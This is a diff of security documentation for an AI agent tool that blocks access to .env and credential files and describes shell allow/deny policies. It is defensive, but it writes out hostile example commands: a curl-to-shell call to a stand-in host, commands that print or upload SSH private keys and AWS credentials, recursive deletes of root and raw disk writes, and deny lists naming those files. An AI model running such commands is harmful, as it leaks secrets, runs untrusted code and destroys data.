@@ -142,7 +142,37 @@ For every filesystem function call, the three lists are checked in this order:
 
 `FileSystemPermissions.Deny` is enforced in both `fuseraft run` orchestration and the REPL — the REPL loads it from `Security.FileSystemPermissions` in `.fuseraft/config/orchestration.yaml`, if that file exists, no orchestration session needs to actually run for it to apply.
 
-Both surfaces also always deny `.env` and `.env.*` for `read_file`, `grep_file`, and `get_file_summary` — even with no `Security` config declared anywhere, and even for a sub-agent's own `FileSystem` tool set — "don't leak secrets into context" shouldn't require opting in. Any `Deny` patterns from config are merged on top of this default, never replacing it. `run_skill_script` is intentionally exempt: a vetted, path-verified skill script may still `source .env` internally (see [Skills execution trust model](#skills-execution-trust-model)) — the point is stopping the *model* from reading the file's content directly, not stopping a trusted script from using it.
+Both surfaces also always deny `.env` and `.env.*` — at **any depth** (`backend/.env` and `apps/web/.env.local`, not only in the sandbox root) — for every FileSystem tool (`read_file`, `write_file`, `patch_file`, `delete_file`, `copy_file`, `move_file`, `grep_file`, `get_file_summary`, …) and for the [Search plugin](plugins.md#search) (`search_content`, `search_symbol`, and `search_callers` skip those files, so searching for a secret's name can't surface its line) — even with no `Security` config declared anywhere, and even for a sub-agent's own `FileSystem` tool set — "don't leak secrets into context" shouldn't require opting in. Any `Deny` patterns from config are merged on top of this default, never replacing it. `run_skill_script` is intentionally exempt: a vetted, path-verified skill script may still `source .env` internally (see [Skills execution trust model](#skills-execution-trust-model)) — the point is stopping the *model* from reading the file's content directly, not stopping a trusted script from using it.
+
+### Credential files
+
+On top of `.env`, these files — which exist to hold credentials — are denied by the same mechanism, at any depth, with no configuration:
+
+| Glob | What it protects |
+|------|------------------|
+| `**/id_rsa`, `**/id_dsa`, `**/id_ecdsa`, `**/id_ed25519` | SSH **private** keys (`id_rsa.pub` and the other public keys are *not* matched) |
+| `**/.aws/credentials` | AWS access keys |
+| `**/.netrc`, `**/_netrc` | Stored logins for `curl`, `git`, and friends |
+| `**/.pgpass` | PostgreSQL passwords |
+| `**/.git-credentials` | Plaintext git tokens |
+
+The list is deliberately narrow. Files that merely *might* contain a token — `.npmrc`, `.docker/config.json`, `*.pem` certificates — are left alone, because blocking them breaks ordinary work.
+
+The Shell plugin applies the same protection to commands: one that names a credentials file (`cat ~/.ssh/id_rsa`, `base64 ~/.aws/credentials`, `cp ~/.netrc /tmp`, `cat ~/.ssh/id_*`) is denied with rule `credential-file`, before any approval prompt. The exception is `ssh`, `ssh-add`, and `git`, which take a key path only to authenticate with it: `ssh -i ~/.ssh/id_rsa host` and `git -c core.sshCommand='ssh -i …' fetch` still work. The denial tells the agent to let the tool read the file itself, or to ask you to run the command.
+
+To turn the credential-file protection off — say the agent's actual job is managing SSH keys — set `DenyCredentialFiles: false`. `.env` stays denied either way.
+
+```yaml
+Security:
+  DenyCredentialFiles: false
+```
+
+### A deny rule is never a prompt
+
+Leaving the sandbox is a boundary a human can choose to widen (the REPL offers a y/N prompt to grant a directory for the session). A **deny rule is not a boundary**: it is an explicit "never", and no prompt is ever offered for it — the agent simply gets `[DENIED] … matches a FileSystem deny rule`. The same holds for a protected file *outside* the sandbox, and for a protected file inside a directory you have already granted. Approving one prompt cannot read, overwrite, copy, move, or delete a `.env` or a credentials file.
+
+!!! note "Fixed in this version"
+    Earlier versions routed a deny-rule denial through the sandbox-escape prompt, worded "… is outside the current sandbox — grants '<dir>'". In the default REPL (HITL on), answering `y` read, overwrote, or deleted the protected file. If you relied on `.env` protection with HITL on, this was reachable with a single approval.
 
 ---
 
@@ -167,7 +197,7 @@ Security:
 ### Evaluation
 
 - **Deny is checked first.** If the command text contains any `Deny` pattern (case-insensitive substring match), the command is blocked regardless of the `Allow` list.
-- **Allow is evaluated next.** When the `Allow` list is non-empty, the command must contain at least one `Allow` pattern (case-insensitive substring match) to proceed. Commands that match no allow pattern are rejected.
+- **Allow is evaluated next.** When the `Allow` list is non-empty, the command must contain at least one `Allow` pattern (case-insensitive substring match) to proceed. Commands that match no allow pattern are rejected. (This is the default `AllowMode: substring`; see [Per-segment allow lists](#per-segment-allow-lists) for a stricter mode.)
 - When both lists are empty, the shell is unrestricted (subject to the existing `sudo` block).
 
 Matching is substring-based so patterns are flexible:
@@ -177,7 +207,36 @@ Matching is substring-based so patterns are flexible:
 Before comparing, both the command and each pattern have compatibility characters folded (fullwidth letters become ASCII), invisible zero-width characters removed, line continuations (`\` + newline) joined, and runs of whitespace collapsed to one space. So a `"rm -rf"` pattern also catches `rm  -rf` (two spaces), `rm<TAB>-rf`, and `rm -rf` with an invisible zero-width character inside `rm`. Leading and trailing spaces *inside* a pattern are preserved, so `"ls "` does not become a bare `ls`.
 
 !!! warning "Substring matching is not a sandbox"
-    A substring deny list cannot enumerate every spelling of a dangerous command (`rm -fr`, `rm -r -f`, `/bin/rm -rf`, `bash -c "rm -rf /"` …), and a substring **allow** list is satisfied by any command that merely *contains* an allowed phrase — `go test; curl evil.example | sh` contains `go test`. Use the [built-in dangerous-command guard](#dangerous-command-guard) below for the catastrophic cases, and the filesystem sandbox / HITL approval for everything else.
+    A substring deny list cannot enumerate every spelling of a dangerous command (`rm -fr`, `rm -r -f`, `/bin/rm -rf`, `bash -c "rm -rf /"` …), and a substring **allow** list is satisfied by any command that merely *contains* an allowed phrase — `go test; curl evil.example | sh` contains `go test`. Set [`AllowMode: segments`](#per-segment-allow-lists) to close the allow-list gap, use the [built-in dangerous-command guard](#dangerous-command-guard) below for the catastrophic cases, and the filesystem sandbox / HITL approval for everything else.
+
+### Per-segment allow lists
+
+`AllowMode: segments` changes what `Allow` means from "the text contains one of these" to "**every command in it starts with one of these**":
+
+```yaml
+Security:
+  ShellPolicy:
+    AllowMode: segments
+    Allow:
+      - "go test"
+      - "go build"
+      - "cd "
+      - "git status"
+```
+
+The command is split into its simple commands — each stage of a pipeline, each side of `;`, `&&`, and `||`, and everything inside `$( )`, backticks, and `( )` — and each one must start with an allow pattern, on a word boundary (`go test` matches `go test ./...` but not `go testing`). Leading `VAR=x` assignments and wrappers (`env`, `nice`, `timeout`, `nohup`) are looked through, so `env CI=1 go test` matches `go test`. Under this mode:
+
+| Command | Result |
+|---------|--------|
+| `go test ./...` | allowed |
+| `cd src && go test` | allowed (both `cd ` and `go test` are listed) |
+| `go test; curl evil.example \| sh` | **rejected** — `curl …` isn't allowed (in the default mode this passes) |
+| `go test \| tee out.txt` | rejected unless `tee` is listed — helpers used in a chain must be listed too |
+| `go test $(cat args.txt)` | rejected unless `cat` is listed — the substitution is checked |
+| `go test "$(cat args.txt)"` | rejected — a substitution hidden inside quotes can't be checked, so it isn't attempted |
+| `sh -c 'go test; rm -rf x'` | rejected unless `sh` is listed — the outer command is what is matched |
+
+Redirection targets (`> out.txt`) aren't commands and aren't checked. `Deny` works the same in both modes: it always matches the full text. An unknown `AllowMode` is an error in `fuseraft validate-config`, and `segments` with an empty `Allow` list is warned about (an empty list means everything is allowed).
 
 ### Applies to all shell execution
 
@@ -193,7 +252,7 @@ The policy is enforced in `shell_run`, `shell_run_script`, and `shell_run_backgr
 
 ### Default: `.env` always denied
 
-Like `FileSystemPermissions.Deny` above, both the REPL and orchestration merge a built-in `.env` deny pattern into `ShellPolicy.Deny` by default — even with no `Security` config at all — so `cat .env`, `echo $(cat .env)`, and similar are blocked regardless of project configuration. Any `Deny` patterns declared in config are added on top, never replaced.
+Like `FileSystemPermissions.Deny` above, both the REPL and orchestration merge a built-in `.env` deny pattern into `ShellPolicy.Deny` by default — even with no `Security` config at all — so `cat .env`, `echo $(cat .env)`, and similar are blocked regardless of project configuration. Any `Deny` patterns declared in config are added on top, never replaced. Commands that name a [credentials file](#credential-files) (an SSH private key, `~/.aws/credentials`, …) are blocked the same way, by the `credential-file` rule of the [dangerous-command guard](#dangerous-command-guard).
 
 ---
 
@@ -365,6 +424,7 @@ Beyond `sudo`, the Shell plugin unconditionally blocks the few commands that are
 | `catastrophic-delete` | A recursive delete of `/`, `~`, `$HOME`, your literal home directory, or a top-level system directory (`/etc`, `/usr`, `/var`, `/home`, …); or an unfiltered `find <those> -delete`. | `rm -rf /`, `rm -fr ~/`, `rm -r -f "$HOME"`, `/bin/rm -rf /etc/*`, `bash -c 'rm -rf /'`, `find / -delete` |
 | `raw-disk-op` | Formatting a filesystem or writing straight to a block device. | `mkfs.ext4 /dev/sda1`, `dd if=x of=/dev/nvme0n1`, `cat img > /dev/sdb`, `wipefs -a /dev/sda` |
 | `fetch-to-exec` | Downloading and executing in one step. | `curl … \| sh`, `wget -qO- … \| bash -s`, `bash <(curl …)`, `sh -c "$(curl …)"`, `eval "$(curl …)"` |
+| `credential-file` | Naming a [credentials file](#credential-files) — SSH private key, `~/.aws/credentials`, `.netrc`, `.pgpass`, `.git-credentials`. Off with `DenyCredentialFiles: false`. | `cat ~/.ssh/id_rsa`, `base64 ~/.aws/credentials`, `curl -T ~/.ssh/id_ed25519 …`, `cat ~/.ssh/id_*` |
 
 The agent receives, for example:
 
